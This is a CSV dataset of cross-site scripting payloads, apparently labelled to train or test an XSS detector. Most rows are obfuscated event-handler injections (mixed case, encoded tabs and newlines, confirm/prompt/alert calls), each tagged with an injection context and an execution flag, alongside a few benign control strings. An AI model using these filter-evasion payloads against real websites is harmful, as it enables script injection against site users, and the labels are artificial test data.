payload,context,exec,combined
<DETails/+/ONpoINTEreNTeR%09=%09[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <DETails/+/ONpoINTEreNTeR%09=%09[8].find(confirm)>
""" onwheel=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onwheel=alert(1) """
<A%0dONpoINterENTeR%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0dONpoINterENTeR%0d=%0dconfirm()>v3dm0s
<dEtAiLS%0aontOGgle%0d=%0d[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <dEtAiLS%0aontOGgle%0d=%0d[8].find(confirm)%0dx>
<a%09OnpoINterEnTEr%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%09OnpoINterEnTEr%09=%09(prompt)``>v3dm0s
<d3v%09OnmoUseoVer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09OnmoUseoVer%0d=%0dconfirm()%0dx>v3dm0s
"<a%0aOnMOusEoVeR%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%0aOnMOusEoVeR%09=%09a=prompt,a()%0dx>v3dm0s"
<HTMl%0aOnmOuSeOVeR%0a=%0a(confirm)()//,html_text,0,CONTEXT_html_text <HTMl%0aOnmOuSeOVeR%0a=%0a(confirm)()//
""" onmouseleave=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onmouseleave=alert(1) """
<htmL%0aONMoUseOvEr%09=%09(prompt)``%0dx>,html_text,0,CONTEXT_html_text <htmL%0aONMoUseOvEr%09=%09(prompt)``%0dx>
</pre><img src=x onerror=alert`1`>,html_tag,1,CONTEXT_html_tag </pre><img src=x onerror=alert`1`>
<d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s
<d3V/+/oNMoUseOVeR%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/oNMoUseOVeR%0a=%0aconfirm()%0dx>v3dm0s
<Html%0aonPOinterENter%0a=%0a[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <Html%0aonPOinterENter%0a=%0a[8].find(confirm)>
<d3V%09oNpOiNTEREntER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09oNpOiNTEREntER%0d=%0dconfirm()%0dx>v3dm0s
<a%09OnpOiNtereNTeR%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a%09OnpOiNtereNTeR%0d=%0d[8].find(confirm)>v3dm0s
<htML/+/oNMoUSEOVEr%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <htML/+/oNMoUSEOVEr%0a=%0aconfirm()%0dx//
<d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s
<A/+/OnmoUSEovEr%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/OnmoUSEovEr%0a=%0aconfirm()>v3dm0s
<HtmL/+/oNmousEoVER%0a=%0a[8].find(confirm)>,html_text,0,CONTEXT_html_text <HtmL/+/oNmousEoVER%0a=%0a[8].find(confirm)>
<D3V%0aOnmoUSeOVEr%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aOnmoUSeOVEr%09=%09(confirm)()%0dx>v3dm0s
<A%0aOnPOInTErENteR%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A%0aOnPOInTErENteR%0d=%0d(prompt)``>v3dm0s
<D3v%09OnpOiNTerEnTer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09OnpOiNTerEnTer%0d=%0d[8].find(confirm)%0dx>v3dm0s
<a%0aoNmoUSEovER%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aoNmoUSEovER%0d=%0d(prompt)``%0dx>v3dm0s
<a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0doNpOiNTerentEr%0d=%0dconfirm()%0dx>v3dm0s
"<A%0dOnpOiNTERentEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0dOnpOiNTERentEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<A%0aonmoUseoVER%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aonmoUseoVER%09=%09confirm()%0dx>v3dm0s
"<htMl/+/onpoINTEREntEr%0a=%0aa=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <htMl/+/onpoINTEREntEr%0a=%0aa=prompt,a()%0dx>"
<A/+/oNMOuSEOveR+=+[8].find(confirm)>v3dm0s,html_text,0,CONTEXT_html_text <A/+/oNMOuSEOveR+=+[8].find(confirm)>v3dm0s
"<d3v%09onMOUSEoveR%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3v%09onMOUSEoveR%09=%09a=prompt,a()%0dx>v3dm0s"
<A%0dOnpOINTErenteR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0dOnpOINTErenteR%0d=%0d[8].find(confirm)%0dx>v3dm0s
<a%0aonMOusEoveR%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aonMOusEoveR%0a=%0aconfirm()%0dx>v3dm0s
<DETaILs%0donpOINTERENter%0a=%0a(prompt)``%0dx>,html_text,0,CONTEXT_html_text <DETaILs%0donpOINTERENter%0a=%0a(prompt)``%0dx>
nothing_here,html_text,0,CONTEXT_html_text nothing_here
<D3v%09onMoUsEOvEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09onMoUsEOvEr%0d=%0d(prompt)``%0dx>v3dm0s
<A%0dOnMOusEoVer%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dOnMOusEoVer%09=%09(confirm)()>v3dm0s
<deTAiLs%0aonPoinTeRenteR+=+confirm()%0dx//,html_text,0,CONTEXT_html_text <deTAiLs%0aonPoinTeRenteR+=+confirm()%0dx//
<a%0aoNPOiNTERENTeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aoNPOiNTERENTeR%09=%09[8].find(confirm)%0dx>v3dm0s
<img src=x>,html_tag,0,CONTEXT_html_tag <img src=x>
<hTmL/+/oNpoiNTeRenteR+=+(prompt)``%0dx//,html_text,0,CONTEXT_html_text <hTmL/+/oNpoiNTeRenteR+=+(prompt)``%0dx//
<d3V%0aoNpoINTeRentER+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <d3V%0aoNpoINTeRentER+=+[8].find(confirm)%0dx>v3dm0s
<d3V%0aonpoINTeRENTER%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0aonpoINTeRENTER%0a=%0a(confirm)()>v3dm0s
<dETaILS%0aONPoiNtEREntEr%09=%09confirm()%0dx//,html_text,0,CONTEXT_html_text <dETaILS%0aONPoiNtEREntEr%09=%09confirm()%0dx//
<a/+/ONPOInTeREnter%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/ONPOInTeREnter%0a=%0a[8].find(confirm)>v3dm0s
<D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s
<d3v%09ONMoUseovER+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <d3v%09ONMoUseovER+=+confirm()>v3dm0s
<D3V/+/ONmousEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/ONmousEOVeR%09=%09[8].find(confirm)%0dx>v3dm0s
<A%0aOnmOuseOVer%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <A%0aOnmOuseOVer%0a=%0a(confirm)()>v3dm0s
"<a%0donPoInTeRentEr+=+a=prompt,a()%0dx>v3dm0s",html_tag,0,"CONTEXT_html_tag <a%0donPoInTeRentEr+=+a=prompt,a()%0dx>v3dm0s"
<D3v%0aonpOInTeRentEr+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <D3v%0aonpOInTeRentEr+=+confirm()%0dx>v3dm0s
<Html%0dOnPoIntErENtER+=+(confirm)()//,html_text,0,CONTEXT_html_text <Html%0dOnPoIntErENtER+=+(confirm)()//
"<A%09OnmoUSeoVER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%09OnmoUSeoVER%09=%09a=prompt,a()>v3dm0s"
<hTml%09OnmoUsEoveR%0d=%0d(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <hTml%09OnmoUsEoveR%0d=%0d(confirm)()%0dx>
<DEtaILs%0doNPOIntEReNter%0a=%0a[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <DEtaILs%0doNPOIntEReNter%0a=%0a[8].find(confirm)%0dx>
<HTml%0donmoUsEover%0d=%0dconfirm()>,html_tag,0,CONTEXT_html_tag <HTml%0donmoUsEover%0d=%0dconfirm()>
<a%0aoNPOiNtereNteR%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%0aoNPOiNtereNteR%0d=%0d(prompt)``>v3dm0s
<D3V%0dOnPOInterENtER%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0dOnPOInterENtER%09=%09(confirm)()>v3dm0s
"<a/+/ONpoINteRENtEr%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <a/+/ONpoINteRENtEr%0a=%0aa=prompt,a()>v3dm0s"
"<D3V%09oNmOUseOvEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3V%09oNmOUseOvEr%0d=%0da=prompt,a()%0dx>v3dm0s"
"<HTMl%0dOnpoiNTErenTeR%0d=%0da=prompt,a()//",html_text,0,"CONTEXT_html_text <HTMl%0dOnpoiNTErenTeR%0d=%0da=prompt,a()//"
<D3v%0dOnPOINTErEnteR%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0dOnPOINTErEnteR%0a=%0aconfirm()%0dx>v3dm0s
<a/+/oNPOiNtERENTEr%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a/+/oNPOiNtERENTEr%0a=%0a[8].find(confirm)>v3dm0s
<a%0donPOIntERenter%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0donPOIntERenter%0a=%0aconfirm()>v3dm0s
<tag attribute=value>,html_text,0,CONTEXT_html_text <tag attribute=value>
<d3v%0aOnMOUSeOver%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aOnMOUSeOver%0a=%0a(prompt)``%0dx>v3dm0s
<DETaILs%0donpOINTERENter%0a=%0a(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <DETaILs%0donpOINTERENter%0a=%0a(prompt)``%0dx>
<hTML%0dONMOUseoVEr%0a=%0aconfirm()//,html_text,0,CONTEXT_html_text <hTML%0dONMOUseoVEr%0a=%0aconfirm()//
<A%09oNPOINtEreNtER+=+(prompt)``>v3dm0s,html_text,0,CONTEXT_html_text <A%09oNPOINtEreNtER+=+(prompt)``>v3dm0s
<a%0dONPOINtErEnTER%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0dONPOINtErEnTER%09=%09confirm()>v3dm0s
"<dEtaILS/+/oNtogGlE%0d=%0da=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <dEtaILS/+/oNtogGlE%0d=%0da=prompt,a()%0dx>"
<D3v%0dOnPOiNterEnteR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0dOnPOiNterEnteR%0a=%0a[8].find(confirm)>v3dm0s
"<d3V%0aONpoInteRENTER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3V%0aONpoInteRENTER%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<A%0aoNMoUseoVEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0aoNMoUseoVEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<DETaILS/+/oNtoGGle%0a=%0a(prompt)``//,html_text,0,CONTEXT_html_text <DETaILS/+/oNtoGGle%0a=%0a(prompt)``//
<A%0donPOINTerENTEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0donPOINTerENTEr%0d=%0dconfirm()>v3dm0s
<a%0aONMOusEoVER+=+(prompt)``%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <a%0aONMOusEoVER+=+(prompt)``%0dx>v3dm0s
<a%0dOnpoInTERENTEr%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0dOnpoInTERENTEr%0a=%0a(confirm)()%0dx>v3dm0s
<A/+/onMOuseoveR%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A/+/onMOuseoveR%0d=%0dconfirm()>v3dm0s
<d3v%0dONMOUsEOVeR%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0dONMOUsEOVeR%09=%09[8].find(confirm)>v3dm0s
<DeTAiLS%0aONPoiNTErentER%0a=%0a[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <DeTAiLS%0aONPoiNTErentER%0a=%0a[8].find(confirm)>
<D3V%0aOnMoUSeOvEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aOnMoUSeOvEr%0d=%0dconfirm()>v3dm0s
<a%09OnMOUsEOVer%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%09OnMOUsEOVer%0d=%0dconfirm()>v3dm0s
<a/+/onpoInTERenTEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/onpoInTERenTEr%09=%09confirm()%0dx>v3dm0s
<hTMl/+/oNmOUSeoVER%0a=%0aconfirm()>,html_tag,0,CONTEXT_html_tag <hTMl/+/oNmOUSeoVER%0a=%0aconfirm()>
<HTML%09ONpoInTERENTER%0a=%0aconfirm()%0dx>,html_text,0,CONTEXT_html_text <HTML%09ONpoInTERENTER%0a=%0aconfirm()%0dx>
<img src=x onerror>,html_text,0,CONTEXT_html_text <img src=x onerror>
<d3V/+/oNMOUSEOVeR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/oNMOUSEOVeR%09=%09confirm()%0dx>v3dm0s
"<DETaiLS%0dONpoiNTErEntEr+=+a=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <DETaiLS%0dONpoiNTErEntEr+=+a=prompt,a()%0dx//"
<DEtaiLs%0aONTOGglE+=+confirm()>,html_text,0,CONTEXT_html_text <DEtaiLs%0aONTOGglE+=+confirm()>
<a%0dONpoINteREntEr%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0dONpoINteREntEr%0d=%0d(confirm)()%0dx>v3dm0s
<A/+/OnMOuSeoVeR%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/OnMOuSeoVeR%0a=%0aconfirm()%0dx>v3dm0s
<Html/+/onPoiNTEReNTEr+=+confirm()//,html_text,0,CONTEXT_html_text <Html/+/onPoiNTEReNTEr+=+confirm()//
<A%0aOnpOINtErENTER+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A%0aOnpOINtErENTER+=+(prompt)``%0dx>v3dm0s
<d3v%09onmOUSeoveR%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09onmOUSeoveR%09=%09confirm()>v3dm0s
<d3V/+/OnmOuSeoVeR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/OnmOuSeoVeR%09=%09(prompt)``%0dx>v3dm0s
"<deTAIls%09ONpoINTEREnTER+=+a=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <deTAIls%09ONpoINTEREnTER+=+a=prompt,a()%0dx>"
<dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>,url_href,0,CONTEXT_url_href <dETAILS%09oNpOINTEREnTER%0a=%0a(confirm)()>
<d3v/+/onPointErEntER%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/onPointErEntER%0a=%0a(confirm)()>v3dm0s
"<d3V%0aOnpoiNtereNteR%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <d3V%0aOnpoiNtereNteR%0a=%0aa=prompt,a()>v3dm0s"
"<HTMl/+/oNPOiNterenTER+=+a=prompt,a()//",html_text,0,"CONTEXT_html_text <HTMl/+/oNPOiNterenTER+=+a=prompt,a()//"
<dEtails/+/ontoGgle+=+confirm()>,html_text,0,CONTEXT_html_text <dEtails/+/ontoGgle+=+confirm()>
<DeTAilS%0dOnPoiNTERENtER+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <DeTAilS%0dOnPoiNTERENtER+=+(confirm)()%0dx>
<a/+/OnpoInTeRenTer+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <a/+/OnpoInTeRenTer+=+(prompt)``%0dx>v3dm0s
<d3V%0dOnmOUSEOVEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dOnmOUSEOVEr%0d=%0d[8].find(confirm)>v3dm0s
<HtMl%0donMoUSeover+=+confirm()//,html_tag,0,CONTEXT_html_tag <HtMl%0donMoUSeover+=+confirm()//
<DetAiLS%0dONTOggLE%0a=%0a(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <DetAiLS%0dONTOggLE%0a=%0a(confirm)()%0dx>
<a%0aonPOiNtEreNTER%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aonPOiNtEreNTER%0a=%0a[8].find(confirm)>v3dm0s
<HtML/+/oNPOINtERENter+=+confirm()%0dx//,html_text,0,CONTEXT_html_text <HtML/+/oNPOINtERENter+=+confirm()%0dx//
<a%0donMOUSeovEr%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%0donMOUSeovEr%09=%09(prompt)``>v3dm0s
<a%0aonPOiNtEreNTER%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a%0aonPOiNtEreNTER%0a=%0a[8].find(confirm)>v3dm0s
"data:text/html,<script>alert(1)</script>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<script>alert(1)</script>"
"<hTML%09ONmoUSeovER%0d=%0da=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <hTML%09ONmoUSeovER%0d=%0da=prompt,a()%0dx>"
<DETaIls%0dOnTOgGLe%09=%09[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <DETaIls%0dOnTOgGLe%09=%09[8].find(confirm)//
<d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s,html_attribute,0,CONTEXT_html_attribute <d3v%0dONPointEREnTer%0a=%0aconfirm()>v3dm0s
<A%09OnpoIntEreNter+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A%09OnpoIntEreNter+=+(prompt)``%0dx>v3dm0s
<HTML/+/OnMOuseovER%0d=%0d(prompt)``%0dx>,html_text,0,CONTEXT_html_text <HTML/+/OnMOuseovER%0d=%0d(prompt)``%0dx>
"""><img src=x onerror=confirm(1)>",html_attribute,1,"CONTEXT_html_attribute ""><img src=x onerror=confirm(1)>"
<d3V%0aonpoinTeRENTeR%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0aonpoinTeRENTeR%0a=%0aconfirm()>v3dm0s
<htmL%0donMoUsEoVeR%0a=%0a(prompt)``//,html_tag,0,CONTEXT_html_tag <htmL%0donMoUsEoVeR%0a=%0a(prompt)``//
<hTmL%0aoNmouseoVER+=+(confirm)()>,html_text,0,CONTEXT_html_text <hTmL%0aoNmouseoVER+=+(confirm)()>
<DEtAilS%0donpoinTeRenTeR%0a=%0a[8].find(confirm)>,html_text,0,CONTEXT_html_text <DEtAilS%0donpoinTeRenTeR%0a=%0a[8].find(confirm)>
<D3V%09OnPOiNtEReNTER%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09OnPOiNtEReNTER%0d=%0d(prompt)``>v3dm0s
<D3v%09ONmOUseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09ONmOUseOVEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<DetAIlS/+/onPOINTereNter%09=%09[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <DetAIlS/+/onPOINTereNter%09=%09[8].find(confirm)%0dx//
<a/+/onpOinterENtER+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <a/+/onpOinterENtER+=+[8].find(confirm)%0dx>v3dm0s
<d3v%0doNpoIntErEntEr+=+[8].find(confirm)>v3dm0s,html_tag,0,CONTEXT_html_tag <d3v%0doNpoIntErEntEr+=+[8].find(confirm)>v3dm0s
<dEtAIls%0dONtOgglE+=+(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <dEtAIls%0dONtOgglE+=+(confirm)()%0dx>
<DeTaIls/+/OntogGlE%0d=%0d(confirm)()//,html_text,0,CONTEXT_html_text <DeTaIls/+/OntogGlE%0d=%0d(confirm)()//
"<a%0doNPOINTeReNter%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%0doNPOINTeReNter%09=%09a=prompt,a()%0dx>v3dm0s"
<D3V/+/OnmoUSeoVer%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/OnmoUSeoVer%09=%09(confirm)()>v3dm0s
<<test>>,html_text,0,CONTEXT_html_text <<test>>
<DEtails%0dontOgglE+=+(prompt)``%0dx>,html_text,0,CONTEXT_html_text <DEtails%0dontOgglE+=+(prompt)``%0dx>
"<hTmL%0aONmOUsEOVeR+=+a=prompt,a()//",html_text,0,"CONTEXT_html_text <hTmL%0aONmOUsEOVeR+=+a=prompt,a()//"
<dEtAilS%0doNpoINterentER%09=%09[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <dEtAilS%0doNpoINterentER%09=%09[8].find(confirm)%0dx>
<HtML%0doNpoINTerEnTeR+=+[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <HtML%0doNpoINTerEnTeR+=+[8].find(confirm)%0dx>
<HtmL%09ONpOInTeREnTeR%0a=%0a(confirm)()>,html_tag,0,CONTEXT_html_tag <HtmL%09ONpOInTeREnTeR%0a=%0a(confirm)()>
<a/+/ONmouSEOver%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a/+/ONmouSEOver%09=%09(confirm)()%0dx>v3dm0s
<dETAIls%0aoNTOgGLE%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <dETAIls%0aoNTOgGLE%09=%09confirm()//
<DeTaILS/+/oNtoGgLe+=+confirm()%0dx//,html_text,0,CONTEXT_html_text <DeTaILS/+/oNtoGgLe+=+confirm()%0dx//
<A%0aOnpOintErentER%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A%0aOnpOintErentER%0d=%0d[8].find(confirm)>v3dm0s
<A/+/oNpoInteReNter%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/oNpoInteReNter%0d=%0d[8].find(confirm)%0dx>v3dm0s
admin_user,html_text,0,CONTEXT_html_text admin_user
"<A/+/onMouseovEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A/+/onMouseovEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
"""mixed'quotes""",html_text,0,"CONTEXT_html_text ""mixed'quotes"""
<a%09onmouSEoVER%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%09onmouSEoVER%0d=%0dconfirm()>v3dm0s
"<A%09OnMoUSeOVEr%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%09OnMoUSeOVEr%09=%09a=prompt,a()>v3dm0s"
""" autofocus onfocus=alert(1) x=""",html_attribute,1,"CONTEXT_html_attribute "" autofocus onfocus=alert(1) x="""
<d3V%0dOnpoIntErEntEr%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dOnpoIntErEntEr%09=%09(confirm)()%0dx>v3dm0s
<d3V/+/onMOusEover%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/onMOusEover%0d=%0d(prompt)``%0dx>v3dm0s
<A%09ONpoINteRENtER%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09ONpoINteRENtER%0a=%0a(prompt)``>v3dm0s
"data:text/html,<script>alert(1)</script>",html_text,0,"CONTEXT_html_text data:text/html,<script>alert(1)</script>"
<D3v%0doNPOInTeRentER%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0doNPOInTeRentER%0a=%0aconfirm()%0dx>v3dm0s
<D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s
<d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09OnPOinterENteR%09=%09confirm()>v3dm0s
<d3v/+/ONMousEoveR%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/ONMousEoveR%0a=%0a(prompt)``>v3dm0s
<a%0aONPointerEnTeR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aONPointerEnTeR%09=%09(prompt)``%0dx>v3dm0s
"<DeTAILS%09oNpointErEntEr+=+a=prompt,a()//",html_text,0,"CONTEXT_html_text <DeTAILS%09oNpointErEntEr+=+a=prompt,a()//"
<D3v%0aOnmouseoVer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aOnmouseoVer%0d=%0dconfirm()%0dx>v3dm0s
</script><svg/onload=alert(1)>,html_tag,1,CONTEXT_html_tag </script><svg/onload=alert(1)>
<svg/onload=confirm`1`>,html_tag,1,CONTEXT_html_tag <svg/onload=confirm`1`>
<D3v%0donMoUSEovEr%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0donMoUSEovEr%0a=%0a(confirm)()>v3dm0s
javascript:,html_text,0,CONTEXT_html_text javascript:
<a/+/onmOUSeOVer+=+(confirm)()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <a/+/onmOUSeOVer+=+(confirm)()%0dx>v3dm0s
<D3V%0donMOuSeOver%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0donMOuSeOver%0d=%0d[8].find(confirm)>v3dm0s
<hTml%0aOnMOUSEOVER%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <hTml%0aOnMOUSEOVER%09=%09confirm()//
